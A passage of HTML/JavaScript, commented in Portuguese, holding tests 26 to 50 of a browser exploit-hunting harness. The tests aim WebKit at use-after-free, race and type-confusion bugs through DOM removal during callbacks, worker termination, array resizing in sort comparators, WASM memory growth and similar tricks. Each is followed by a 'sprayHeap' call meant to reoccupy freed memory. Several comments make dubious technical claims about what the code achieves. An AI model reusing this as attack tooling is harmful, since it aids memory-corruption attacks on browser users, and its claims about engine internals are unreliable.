            var root = document.createElement('div');
            var p = document.createElement('p');
            var span = document.createElement('span');
            p.appendChild(span);
            root.appendChild(p);
            document.body.appendChild(root);

            var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null, false);
            
            // Caminha até o span
            walker.nextNode(); // p
            walker.nextNode(); // span
            
            log("Walker no span. Removendo pai e filho...");
            
            // Remove o 'p' (que carrega o 'span')
            root.removeChild(p);
            
            // Tenta confundir a referência interna do walker
            p = null;
            span = null;
            sprayHeap();

            try {
                // Onde está o walker agora? 
                // Ele deveria saber que o nó atual foi removido da árvore.
                var node = walker.currentNode;
                log("Current Node tag: " + node.tagName); // Se retornar lixo ou tag errada...
                
                // Tenta caminhar a partir do nó morto
                walker.nextNode(); 
            } catch(e) {
                log("Erro: " + e);
            }
        }
// --- TESTE 26: DataTransfer Item List UAF ---
        // Objetos DataTransfer (Drag and Drop) possuem listas de itens que são
        // gerenciadas pelo C++. Se manipularmos o DOM durante um evento de drag,
        // podemos invalidar a referência da lista de itens.
        function runTest26() {
            log("Iniciando Test 26: Drag & Drop UAF...");
            
            var dragSrc = document.createElement('div');
            dragSrc.draggable = true;
            dragSrc.innerText = "DRAG ME";
            document.body.appendChild(dragSrc);

            dragSrc.ondragstart = function(e) {
                log("Drag iniciado...");
                // Adiciona dados
                e.dataTransfer.setData('text/plain', 'payload');
                
                // Agendamos a destruição para o meio do processo
                setTimeout(() => {
                    log("Destruindo elemento durante drag...");
                    dragSrc.remove();
                    sprayHeap();
                }, 10);
            };

            dragSrc.ondragend = function(e) {
                // Se o elemento foi removido, o 'e.dataTransfer' ainda existe?
                // Tentar acessar propriedades aqui pode causar crash
                try {
                    var items = e.dataTransfer.items;
                    log("Items length: " + items.length); 
                    items.add("crash", "text/plain"); // Escrita em objeto morto?
                } catch(err) {
                    log("Erro capturado: " + err);
                }
            };

            // Simula clique (Usuário real precisa arrastar)
            log("POR FAVOR: Arraste o texto 'DRAG ME' na tela.");
        }

        // --- TESTE 27: FileReader Worker Termination Race ---
        // Iniciamos a leitura de um Blob em um Worker e terminamos o Worker
        // imediatamente. O objetivo é que o callback interno do FileReader (C++)
        // tente escrever no buffer de memória do Worker que já foi desalocado.
        function runTest27() {
            log("Iniciando Test 27: Worker FileReader Race...");

            var blob = new Blob(["A".repeat(1024 * 1024 * 5)]); // 5MB Blob
            
            // Código do Worker
            var blobUrl = URL.createObjectURL(new Blob([`
                self.onmessage = function(e) {
                    var reader = new FileReader();
                    reader.readAsArrayBuffer(e.data);
                    reader.onload = function() { postMessage("done"); }
                }
            `], {type: 'application/javascript'}));

            var worker = new Worker(blobUrl);
            
            worker.onmessage = function() {
                log("Leitura completada (Falha na race condition).");
            };

            // Inicia leitura
            worker.postMessage(blob);

            // Tenta acertar a janela de tempo exata onde o FileReader alocou recurso mas não terminou
            // O tempo varia, então fazemos em loop ou delay aleatório
            setTimeout(() => {
                log("TERMINANDO WORKER AGORA!");
                worker.terminate();
                worker = null;
                sprayHeap(); // Tenta reusar a memória do thread
            }, 5); // 5ms é uma aposta para "durante a leitura"
        }

        // --- TESTE 28: Range Insertion Mutation ---
        // O método insertNode do Range é complexo. Ele divide nós de texto.
        // Se usarmos um MutationObserver para reagir à divisão e invalidar o Range
        // antes da inserção completar, temos um UAF.
        function runTest28() {
            log("Iniciando Test 28: Range Split Mutation...");

            var div = document.createElement('div');
            var text = document.createTextNode("TEXTO MUITO LONGO PARA DIVIDIR");
            div.appendChild(text);
            document.body.appendChild(div);

            var range = document.createRange();
            range.setStart(text, 5); // Meio do texto
            range.setEnd(text, 10);

            // Observa mudanças
            var observer = new MutationObserver(function(mutations) {
                log("Mutação detectada! Invalidando range...");
                // Remove o nó pai inteiramente
                div.remove();
                sprayHeap();
            });

            observer.observe(div, { childList: true, subtree: true });

            var span = document.createElement('span');
            span.innerText = "INSERTED";

            try {
                // insertNode vai dividir o TextNode em dois. 
                // A mutação da divisão dispara o observer.
                // O observer remove o 'div'.
                // insertNode tenta continuar inserindo o 'span' no 'div' morto.
                range.insertNode(span);
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 29: Canvas Proxy Type Confusion ---
        // O método drawImage espera um elemento (Img, Canvas, Video).
        // Se passarmos um Proxy, podemos interceptar as leituras de propriedades
        // como 'width' e 'height' e retornar valores que mudam, ou lançar exceções
        // que deixam o contexto Canvas em estado inconsistente.
        function runTest29() {
            log("Iniciando Test 29: Canvas Proxy Confusion...");

            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');

            // Objeto falso que se parece com uma imagem
            var evilImage = new Proxy({}, {
                get: function(target, prop) {
                    if (prop === "width") return 100;
                    if (prop === "height") return 100;
                    if (prop === "tagName") return "IMG"; // Engana verificações simples
                    
                    // Se o navegador tentar pegar os dados do pixel...
                    log("Acesso à propriedade: " + prop);
                    return {}; 
                }
            });

            try {
                // O WebKit converte inputs. Se ele confiar cegamente que é um objeto renderizável
                // e tentar fazer cast para HTMLImageElement*, pode crashar.
                ctx.drawImage(evilImage, 0, 0);
            } catch(e) {
                log("Erro (Browser protegeu): " + e.message);
            }
        }

        // --- TESTE 30: History State Serialization Destruction ---
        // Inspirado no seu JSON "WebKit serialized form state".
        // Tentamos salvar um estado no histórico que contém um objeto com um Getter.
        // O Getter fecha o documento atual (navigating away).
        // O serializador tenta continuar lendo objetos de um documento fechado.
        function runTest30() {
            log("Iniciando Test 30: Serializer Self-Destruct...");

            var bomb = {};
            Object.defineProperty(bomb, "explode", {
                get: function() {
                    log("Serializando... DESTRUINDO MUNDO!");
                    // Navega para 'about:blank', destruindo o contexto atual
                    // Mas a navegação pode ser assíncrona.
                    // Vamos tentar destruir o corpo para ser mais imediato.
                    document.body.innerHTML = "";
                    
                    // Tenta forçar liberação de memória
                    sprayHeap();
                    
                    return "BOOM";
                },
                enumerable: true // Importante para ser serializado
            });

            try {
                // pushState serializa o objeto 'bomb'.
                // Quando ler 'explode', executa o getter.
                history.pushState(bomb, "Title", "?bomb");
                log("Sobreviveu.");
            } catch(e) {
                log("Erro: " + e);
            }
        }
 // --- TESTE 31: Reflect.construct Proxy Trap ---
        // Este teste ataca o processo de criação de objetos C++.
        // Usamos Reflect.construct para criar um objeto, mas passamos um Proxy
        // como "newTarget". O WebKit precisa ler o 'prototype' do newTarget.
        // Se mudarmos o estado do sistema DENTRO do getter do prototype,
        // o construtor C++ pode rodar em um estado inválido.
        function runTest31() {
            log("Iniciando Test 31: Reflect Proxy Trap...");
            
            // O alvo é uma classe nativa (ex: Image ou MessageChannel)
            const Target = Image; 
            
            const handler = {
                get: function(target, prop, receiver) {
                    if (prop === 'prototype') {
                        log("Trap ativado! Acessando 'prototype' durante a construção...");
                        // Aqui o motor já alocou memória para a Imagem, mas não inicializou.
                        // Tenta forçar Garbage Collection
                        sprayHeap();
                        return Object.prototype;
                    }
                    return Reflect.get(target, prop, receiver);
                }
            };

            const NewTarget = new Proxy(function(){}, handler);

            try {
                // Tenta construir 'Image' usando nosso Proxy como blueprint
                // O WebKit pega o ponteiro da nova imagem -> Chama o getter -> Nós rodamos JS
                Reflect.construct(Target, [], NewTarget);
                log("Objeto construído sem crash.");
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 32: Array.sort Resizing ---
        // Um clássico absoluto. O algoritmo de sort em C++ assume que o tamanho
        // do array não muda. Se passarmos uma função de comparação que muda o tamanho
        // do array (reduzindo-o), o sort continua acessando índices que não existem mais.
        function runTest32() {
            log("Iniciando Test 32: Array Sort OOB...");
            
            // Cria array com floats
            var arr = [];
            for(var i=0; i<100; i++) arr[i] = Math.random();
            
            // Função de comparação maliciosa
            function maliciousCompare(a, b) {
                if (arr.length === 100) {
                    log("Comparador rodando. Reduzindo array para 0...");
                    arr.length = 0; // Zera o array
                    sprayHeap();    // Ocupa a memória antiga
                }
                return a - b;
            }

            try {
                log("Iniciando sort...");
                // Se o WebKit não tiver verificação de bounds a cada iteração,
                // ele vai ler/escrever na memória onde o array costumava estar.
                arr.sort(maliciousCompare);
                log("Sort finalizado.");
            } catch(e) {
                log("Erro (Safe): " + e);
            }
        }

        // --- TESTE 33: XSLTProcessor Use-After-Free ---
        // XSLT (XML Transformations) é uma engine antiga e complexa.
        // Se importarmos uma folha de estilo que executa script (via extensão),
        // e esse script deletar o nó do documento que está sendo processado...
        function runTest33() {
            log("Iniciando Test 33: XSLT Logic...");
            
            if (!window.XSLTProcessor) { log("XSLT não suportado."); return; }

            var processor = new XSLTProcessor();
            
            // XML base
            var xmlString = "<root><child>text</child></root>";
            var parser = new DOMParser();
            var xmlDoc = parser.parseFromString(xmlString, "text/xml");
            
            // XSLT Stylesheet
            var xslString = `
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                    <xsl:template match="/">
                        <xsl:for-each select="//child">
                            <span>Converted</span>
                        </xsl:for-each>
                    </xsl:template>
                </xsl:stylesheet>
            `;
            var xslDoc = parser.parseFromString(xslString, "text/xml");

            processor.importStylesheet(xslDoc);
            
            // Tenta destruir o XMLDoc logo antes/durante a transformação
            // Em um cenário real, usaríamos Race Condition com Workers,
            // aqui simulamos a lógica de referência.
            var fragment = processor.transformToFragment(xmlDoc, document);
            
            // Agora manipulamos o resultado e tentamos confundir o processador
            xmlDoc = null; 
            xslDoc = null;
            sprayHeap();
            
            // Reutiliza o processador "sujo"
            try {
                // Se o processador manteve referências internas aos docs antigos...
                var frag2 = processor.transformToFragment(parser.parseFromString("<a/>", "text/xml"), document);
                log("Transformação 2 OK.");
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 34: Intl.Collator Memory Corruption ---
        // A biblioteca ICU (usada pelo Intl) lida com strings complexas.
        // Algumas implementações falham ao lidar com locales muito grandes ou mal formados,
        // causando Buffer Overflow na stack ou heap C++.
        function runTest34() {
            log("Iniciando Test 34: Intl ICU Crash...");
            
            try {
                // Cria uma string de locale gigantesca e inválida
                // Isso tenta estourar buffers internos de parsing de locale
                var bigLocale = "en-u-co-phonebk";
                for(let i=0; i<2000; i++) bigLocale += "-x-private";
                
                log("Tentando instanciar Collator com locale gigante...");
                var collator = new Intl.Collator([bigLocale]);
                
                // Se passou, tenta usar compare
                collator.compare("a", "b");
                log("Sobreviveu.");
            } catch(e) {
                // Erros de RangeError são normais. Queremos o crash.
                log("Erro JS capturado: " + e.message);
            }
        }

        // --- TESTE 35: Object.seal Property Redefinition ---
        // Object.seal impede adição/remoção de propriedades, mas permite alteração.
        // Se usarmos Object.defineProperty em um objeto selado de forma a transicionar
        // o armazenamento interno (de propriedades rápidas para dicionário) concorrentemente.
        function runTest35() {
            log("Iniciando Test 35: Seal Transition...");
            
            var obj = { x: 1 };
            Object.seal(obj);
            
            // Tenta confundir o formato interno do objeto
            try {
                // DefineProperty em objeto selado é delicado.
                // Tenta mudar de 'data descriptor' para 'accessor descriptor'
                // Isso força o motor a realocar a estrutura interna do objeto.
                Object.defineProperty(obj, 'x', {
                    get: function() { 
                        // DENTRO da redefinição, acessamos o objeto
                        log("Acesso dentro do defineProperty");
                        return 2; 
                    },
                    configurable: false 
                });
                
                log("Redefinição completa. Valor: " + obj.x);
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
// --- TESTE 36: BroadcastChannel Message UAF ---
        // Canais de broadcast comunicam entre contextos.
        // Se fecharmos o canal no momento exato em que uma mensagem está sendo
        // deserializada na fila de eventos, podemos corromper o buffer da mensagem.
        function runTest36() {
            log("Iniciando Test 36: BroadcastChannel...");
            
            if (!window.BroadcastChannel) { log("BroadcastChannel não suportado."); return; }

            const channelName = "exploit_channel_" + Math.random();
            const sender = new BroadcastChannel(channelName);
            const receiver = new BroadcastChannel(channelName);
            
            // Payload complexo para forçar deserialização lenta
            const payload = {
                data: new Uint8Array(1024 * 10).fill(0x41),
                info: "Teste de UAF"
            };

            receiver.onmessage = function(e) {
                log("Mensagem recebida. Estado: " + e.data.info);
            };

            // Envia mensagem
            sender.postMessage(payload);
            
            // Tenta fechar o receptor IMEDIATAMENTE após o envio, 
            // antes do evento 'message' disparar no loop de eventos.
            // O WebKit pode tentar entregar a mensagem para um canal fechado/destruído.
            log("Fechando canal receiver agressivamente...");
            receiver.close();
            
            // Spray para sobrescrever a memória do objeto receiver
            sprayHeap();
            
            // Tenta forçar o evento a disparar (se ainda estiver na fila)
            setTimeout(() => log("Teste 36 finalizado (Sem crash = Safe)"), 500);
        }

        // --- TESTE 37: Map Iterator Invalidation ---
        // Iteradores C++ mantêm ponteiros para os buckets da hash table.
        // Se limparmos o Map (clear) DURANTE a iteração, o iterador torna-se inválido.
        // O JS protege isso, mas falhas na implementação (bypasses) são comuns.
        function runTest37() {
            log("Iniciando Test 37: Map Iterator...");
            
            const map = new Map();
            for(let i=0; i<100; i++) map.set(i, {id: i});
            
            log("Iterando e limpando...");
            
            try {
                let i = 0;
                for (const [key, value] of map) {
                    if (i === 2) {
                        log("Limpando MAP no meio do loop!");
                        map.clear(); // Esvazia o container
                        sprayHeap(); // Ocupa memória
                    }
                    
                    // Se a proteção falhar, 'value' na iteração 3 será lixo de memória
                    if (i > 2) {
                        log("Acessando item pós-clear: " + value);
                    }
                    i++;
                }
            } catch(e) {
                log("Erro (Proteção ativa): " + e.message);
            }
        }

        // --- TESTE 38: Promise Microtask Object Destruction ---
        // Microtasks (Promises) rodam logo após o código atual, mas antes da renderização.
        // Podemos criar uma situação onde uma Promise mantém uma referência a um objeto
        // que nós forçamos a destruição via API DOM (ex: remove()).
        function runTest38() {
            log("Iniciando Test 38: Promise Microtask...");
            
            let el = document.createElement('div');
            el.id = "promise_victim";
            document.body.appendChild(el);
            
            // Cria uma Promise resolvida
            Promise.resolve().then(() => {
                log("Microtask 1: Destruindo elemento...");
                el.remove();
                el = null; // Remove referência JS
                
                // Agenda outra microtask imediata para tentar "ganhar" do Garbage Collector
                return Promise.resolve();
            }).then(() => {
                log("Microtask 2: Spraying...");
                sprayHeap();
                
                // Tenta acessar o elemento via ID (se o cache do DOM não limpou)
                // ou via alguma referência interna esquecida
                let ghost = document.getElementById("promise_victim");
                if (ghost) {
                    log("Elemento ainda encontrado (Zombie): " + ghost);
                } else {
                    log("Elemento limpo corretamente.");
                }
            });
        }

        // --- TESTE 39: document.open() Reset Race ---
        // document.open() limpa todo o DOM e listeners. 
        // É um "reset" violento. Se chamado dentro de um evento, 
        // o evento original pode tentar continuar executando em um documento "morto".
        function runTest39() {
            log("Iniciando Test 39: document.open() Race...");
            
            let iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            
            let d = iframe.contentDocument;
            d.write("<h1>Iframe</h1>");
            d.close();
            
            // Adiciona um listener no documento do iframe
            d.addEventListener('click', function() {
                log("Click no iframe! Resetando documento...");
                
                // O evento 'click' está na pilha.
                // document.open() destroi o DOM atual.
                iframe.contentDocument.open();
                iframe.contentDocument.write("Novo");
                iframe.contentDocument.close();
                
                sprayHeap();
                // O WebKit pode tentar acessar o alvo do evento (target) ao sair do handler
            });
            
            log("Simulando clique no iframe...");
            // Dispara evento
            d.body.click();
        }

        // --- TESTE 40: DOMParser Node Adoption ---
        // Parsear XML gera um novo documento temporário.
        // Tentar mover nós desse documento temporário para o documento principal
        // e destruir o parser simultaneamente.
        function runTest40() {
            log("Iniciando Test 40: DOMParser Adoption...");
            
            let parser = new DOMParser();
            let xmlString = "<root><item id='target'>DATA</item></root>";
            let doc = parser.parseFromString(xmlString, "text/xml");
            
            let node = doc.getElementById("target");
            
            log("Nó obtido do parser. Importando...");
            
            // Move o nó para o documento atual
            // A implementação deve garantir que o nó seja desconectado corretamente do doc antigo
            let imported = document.importNode(node, true);
            
            // Destroi referências ao documento de origem
            doc = null;
            parser = null;
            node = null;
            
            sprayHeap(); // Tenta sobrescrever o documento XML antigo
            
            // Acessa o nó importado. Se ele dependia de algo no documento antigo (ex: namespace), crash.
            document.body.appendChild(imported);
            log("Nó adicionado: " + imported.tagName);
        }
 // --- TESTE 41: WebAssembly Memory Growth ---
        // Quando a memória WASM cresce, ela pode ser movida para um novo endereço.
        // Se mantivermos uma 'View' (Uint8Array) apontando para o endereço antigo,
        // e acessarmos essa View após o crescimento, lemos memória inválida.
        function runTest41() {
            log("Iniciando Test 41: WASM Detach...");
            
            if (!window.WebAssembly) { log("WASM não suportado."); return; }

            try {
                // 1. Cria memória com 1 página (64KB)
                var mem = new WebAssembly.Memory({initial: 1});
                
                // 2. Cria uma "janela" para ver essa memória
                var view = new Uint8Array(mem.buffer);
                view[0] = 0xAA; // Marcador
                
                log("Memória alocada. Tentando crescer...");
                
                // 3. Força o crescimento. Isso DEVE invalidar 'view' (detach).
                // O WebKit deve zerar o buffer da view antiga.
                mem.grow(1); 
                
                // 4. Spray imediato para ocupar o local antigo
                sprayHeap();

                // 5. Tenta acessar a view antiga
                if (view.length === 0) {
                    log("Seguro: View foi neutralizada (length 0).");
                } else {
                    // Se o length ainda for > 0, temos acesso à memória morta!
                    log("PERIGO: View antiga ainda ativa! Length: " + view.length);
                    log("Lendo byte fantasma: " + view[0]); // Crash ou Leak
                }

            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 42: ReadableStream Tee Cancel Race ---
        // Streams podem ser bifurcadas (Tee). Cancelar uma bifurcação
        // enquanto a outra lê pode causar confusão sobre quem é dono do buffer.
        function runTest42() {
            log("Iniciando Test 42: Stream Tee Race...");
            
            if (!window.ReadableStream) { log("Streams API ausente."); return; }

            // Cria stream infinita de lixo
            const stream = new ReadableStream({
                start(controller) {
                    controller.enqueue(new Uint8Array(100).fill(1));
                },
                pull(controller) {
                    controller.enqueue(new Uint8Array(100).fill(1));
                }
            });

            // Bifurca
            const [branch1, branch2] = stream.tee();
            const reader1 = branch1.getReader();
            
            log("Lendo branch 1 e cancelando branch 2 simultaneamente...");

            // Race Condition
            reader1.read().then(({value, done}) => {
                // Lê dados
            });
            
            // Cancela a outra perna agressivamente
            branch2.cancel("Motivo do Caos");
            
            // Tenta forçar Garbage Collection nos controllers
            sprayHeap();
            
            setTimeout(() => log("Teste 42 finalizado."), 500);
        }

        // --- TESTE 43: HarfBuzz Font Shaping Overflow ---
        // Baseado no seu dump (libharfbuzz).
        // Usamos CSS 'font-variation-settings' com valores extremos ou malformados
        // para tentar estourar o buffer de parsing da engine de fontes.
        function runTest43() {
            log("Iniciando Test 43: Font Shaping...");
            
            var el = document.createElement('div');
            el.innerText = "TESTE DE FONTE CRÍTICO";
            el.style.fontFamily = "sans-serif";
            el.style.fontSize = "100px";
            document.body.appendChild(el);

            try {
                // Gera string de settings massiva
                // Ex: "wght" 99999999, "wdth" -9999999...
                let settings = "";
                for(let i=0; i<100; i++) {
                    settings += `"axis${i}" ${Number.MAX_SAFE_INTEGER}, `;
                }
                settings += `"wght" 500`;

                log("Aplicando settings extremos...");
                el.style.fontVariationSettings = settings;
                
                // Força layout
                let width = el.offsetWidth;
                
                // Muda rapidamente
                el.style.fontVariationSettings = "normal";
                
                log("Layout calculado: " + width);
            } catch(e) {
                log("Erro: " + e);
            }
            
            setTimeout(() => el.remove(), 2000);
        }

        // --- TESTE 44: DOMMatrix NaN Poisoning ---
        // Injetar 'NaN' (Not a Number) ou 'Infinity' em cálculos de geometria
        // pode quebrar verificações de segurança em C++ que assumem números válidos.
        function runTest44() {
            log("Iniciando Test 44: DOMMatrix Poison...");
            
            if (!window.DOMMatrix) { log("DOMMatrix ausente."); return; }

            try {
                var m = new DOMMatrix();
                
                // Envenena a matriz
                m.a = NaN; 
                m.b = Infinity;
                m.c = -Infinity;
                
                log("Matriz envenenada criada.");
                
                var el = document.createElement('div');
                el.style.width = "100px";
                el.style.height = "100px";
                el.style.background = "blue";
                document.body.appendChild(el);
                
                // Tenta aplicar matriz inválida ao CSS
                // WebKit deveria sanitizar, mas as vezes falha
                var transform = m.toString(); 
                el.style.transform = transform;
                
                // Tenta operações matemáticas com a matriz suja
                var point = new DOMPoint(10, 10);
                var result = point.matrixTransform(m);
                
                log("Transformação calculada: " + result.x); // Se imprimir NaN, ok. Se crashar, bingo.
                
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 45: Object.prototype Setter Trap ---
        // Poluição de protótipo que afeta criação de objetos internos.
        // Se o WebKit criar um objeto interno usando dicionário JS e nós tivermos
        // interceptado o setter, podemos rodar código em momento inoportuno.
        function runTest45() {
            log("Iniciando Test 45: Prototype Trap...");
            
            // Define um setter malicioso em TODOS os objetos
            // Alvo: Propriedades comuns como 'id', 'name', 'type'
            let propertyToTrap = "toJSON"; 
            
            try {
                Object.defineProperty(Object.prototype, propertyToTrap, {
                    set: function(val) {
                        log("Trap ativado! O navegador tentou definir 'toJSON'.");
                        // Roda spray para tentar corromper quem está definindo isso
                        sprayHeap();
                    },
                    configurable: true
                });
                
                // Trigger: Usa JSON.stringify que pode tentar ler/escrever toJSON
                // ou APIs internas que usam serialização
                let o = {a: 1};
                JSON.stringify(o);
                
                log("Trap configurado. Aguardando trigger sistêmico...");
                
                // Limpeza (para não quebrar o resto do console)
                delete Object.prototype[propertyToTrap];
                
            } catch(e) {
                log("Erro: " + e);
            }
        }
// --- TESTE 46: OffscreenCanvas Bitmap Transfer Race ---
        // OffscreenCanvas permite desenhar em Workers.
        // Ao transferir o bitmap para a thread principal, a memória subjacente muda de dono.
        // Se tentarmos desenhar no canvas "neutered" (esvaziado) simultaneamente, podemos crashar a GPU.
        function runTest46() {
            log("Iniciando Test 46: OffscreenCanvas Transfer...");
            
            if (!window.OffscreenCanvas) { log("OffscreenCanvas não suportado."); return; }

            // Worker que desenha e transfere agressivamente
            const workerCode = `
                self.onmessage = function(e) {
                    const canvas = e.data;
                    const ctx = canvas.getContext('2d');
                    
                    // Desenha algo
                    ctx.fillStyle = 'red';
                    ctx.fillRect(0, 0, 100, 100);
                    
                    // Loop de transferência
                    // Tenta transferir o bitmap enquanto o contexto ainda pode estar ativo internamente
                    try {
                        const bitmap = canvas.transferToImageBitmap();
                        self.postMessage(bitmap, [bitmap]);
                        
                        // Tenta usar o contexto DEPOIS de transferir (UAF potencial no contexto gráfico)
                        ctx.fillRect(10, 10, 50, 50);
                    } catch(err) {
                        // Ignora erros de lógica, queremos falhas de memória
                    }
                };
            `;
            
            const blob = new Blob([workerCode], {type: 'text/javascript'});
            const worker = new Worker(URL.createObjectURL(blob));
            
            const canvas = new OffscreenCanvas(100, 100);
            
            worker.onmessage = function(e) {
                log("Bitmap recebido. Worker sobreviveu à transferência.");
                // Limpeza
                e.data.close(); 
            };
            
            // Envia o canvas (transferable)
            worker.postMessage(canvas, [canvas]);
            
            setTimeout(() => {
                log("Encerrando teste 46.");
                worker.terminate();
            }, 1000);
        }

        // --- TESTE 47: Sliced Blob Revocation ---
        // Slicing (fatiar) um Blob cria uma referência ao Blob pai.
        // Se lermos o filho em um Worker e revogarmos o pai na thread principal,
        // podemos invalidar o recurso subjacente durante a leitura.
        function runTest47() {
            log("Iniciando Test 47: Blob Slice Race...");
            
            // 1. Cria blob pai (10MB)
            let parentData = new Uint8Array(1024 * 1024 * 10).fill(0x41);
            let parentBlob = new Blob([parentData]);
            
            // 2. Cria slice (filho)
            let childBlob = parentBlob.slice(0, 1024 * 1024);
            
            // 3. Worker para ler o filho (FileReaderSync é síncrono no Worker)
            const workerCode = `
                self.onmessage = function(e) {
                    try {
                        const reader = new FileReaderSync();
                        // Lê o filho. Se o pai morrer no meio, o ponteiro de dados falha?
                        const result = reader.readAsArrayBuffer(e.data);
                        self.postMessage("Leitura OK: " + result.byteLength);
                    } catch(err) {
                        self.postMessage("Erro leitura: " + err);
                    }
                };
            `;
            
            const worker = new Worker(URL.createObjectURL(new Blob([workerCode], {type: 'text/javascript'})));
            
            worker.onmessage = function(e) {
                log(e.data);
            };

            // Inicia leitura
            worker.postMessage(childBlob);
            
            // Tenta destruir o pai (e a memória subjacente) IMEDIATAMENTE
            // Em implementações vulneráveis, o slice depende do pai estar vivo.
            log("Revogando/Zerando Blob pai...");
            parentBlob = null;
            parentData = null; // Remove referência JS
            
            // Spray para tentar sobrescrever os dados do Blob original
            sprayHeap();
        }

        // --- TESTE 48: ScriptProcessorNode Disconnect UAF ---
        // ScriptProcessorNode (API de áudio legada) usa buffers de áudio na thread principal.
        // Manipular o grafo de áudio (desconectar) DENTRO do evento de processamento é perigoso.
        function runTest48() {
            log("Iniciando Test 48: Audio Processor Disconnect...");
            
            try {
                const AudioCtor = window.AudioContext || window.webkitAudioContext;
                if (!AudioCtor) { log("WebAudio não suportado."); return; }
                
                const ctx = new AudioCtor();
                // Cria processador com buffer grande (4096 samples)
                const node = ctx.createScriptProcessor(4096, 1, 1);
                
                node.onaudioprocess = function(e) {
                    log("Processando audio... Desconectando agora!");
                    
                    // 1. Pega referência ao buffer de saída (ponteiro C++)
                    const outputBuffer = e.outputBuffer;
                    
                    // 2. Desconecta o nó do destino (tenta matar o fluxo)
                    node.disconnect();
                    
                    // 3. Tenta escrever no buffer de áudio que pode ter sido marcado para limpeza
                    const data = outputBuffer.getChannelData(0);
                    // Escreve lixo
                    for (let i = 0; i < data.length; i++) {
                        data[i] = Math.random(); 
                    }
                    
                    sprayHeap();
                };
                
                // Conecta para iniciar
                node.connect(ctx.destination);
                log("Audio iniciado. Aguardando callback...");
                
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 49: DOM Node.normalize() Mutation ---
        // 'normalize()' funde nós de texto adjacentes.
        // Se usarmos um MutationObserver para remover um nó NO MEIO da fusão,
        // o algoritmo de normalização pode tentar acessar o nó removido.
        function runTest49() {
            log("Iniciando Test 49: DOM Normalize Mutation...");
            
            const div = document.createElement('div');
            const t1 = document.createTextNode("A");
            const t2 = document.createTextNode("B");
            const t3 = document.createTextNode("C");
            
            div.appendChild(t1);
            div.appendChild(t2);
            div.appendChild(t3);
            
            // Observer vigia remoção de nós
            const observer = new MutationObserver((mutations) => {
                for(let m of mutations) {
                    // Quando a normalização começa a remover nós redundantes...
                    if (m.removedNodes.length > 0) {
                        log("Observer: Nó removido pela normalização. Intervindo!");
                        
                        // Tenta remover o próximo nó manualmente para confundir o loop C++
                        try {
                             div.removeChild(t3); 
                             sprayHeap();
                        } catch(e) {}
                    }
                }
            });
            
            observer.observe(div, { childList: true });
            
            log("Executando normalize()...");
            // Isso deve fundir t1, t2, t3 em um único nó de texto.
            // O observer vai disparar quando t2 for absorvido por t1.
            // Nesse momento, tentamos remover t3.
            try {
                div.normalize();
                log("Normalize concluído (Safe). Texto final: " + div.textContent);
            } catch(e) {
                log("Erro: " + e);
            }
        }

        // --- TESTE 50: FontFaceSet Loading State Confusion ---
        // A API de carregamento de fontes é assíncrona e complexa.
        // Adicionamos uma fonte, iniciamos o load, e limpamos o Set global.
        // O callback de conclusão do load tenta atualizar o status da fonte que não está mais no Set.
        function runTest50() {
            log("Iniciando Test 50: FontFaceSet Confusion...");
            
            // Cria fonte fantasma
            const font = new FontFace('HackFont', 'url(data:font/woff;base64,AAAA)');
            
            // Adiciona ao documento
            document.fonts.add(font);
            
            // Inicia carregamento
            font.load().then(() => {
                log("Load Promessa resolvida (Inesperado para fonte vazia).");
            }).catch((e) => {
                log("Load falhou (Esperado). Verificando integridade...");
                // Neste ponto, o motor C++ está manipulando o erro.
                // Se o objeto 'font' foi corrompido pela limpeza abaixo, pode haver crash.
            });
            
            log("Limpando document.fonts durante o loading...");
            // Remove todas as fontes (incluindo a que está carregando)
            document.fonts.clear();
            
            // Remove a referência JS para permitir GC
            // font = null; // (Comentado para não dar erro de referência no script, mas na prática seria feito)
            
            sprayHeap();
            
            // Tenta acessar propriedade da fonte que foi removida do set mas ainda processa o load
            try {
                let s = font.status;
                log("Status da fonte órfã: " + s);
            } catch(e) {
                log("Erro: " + e);
            }
        }

    </script>
</body>
</html>
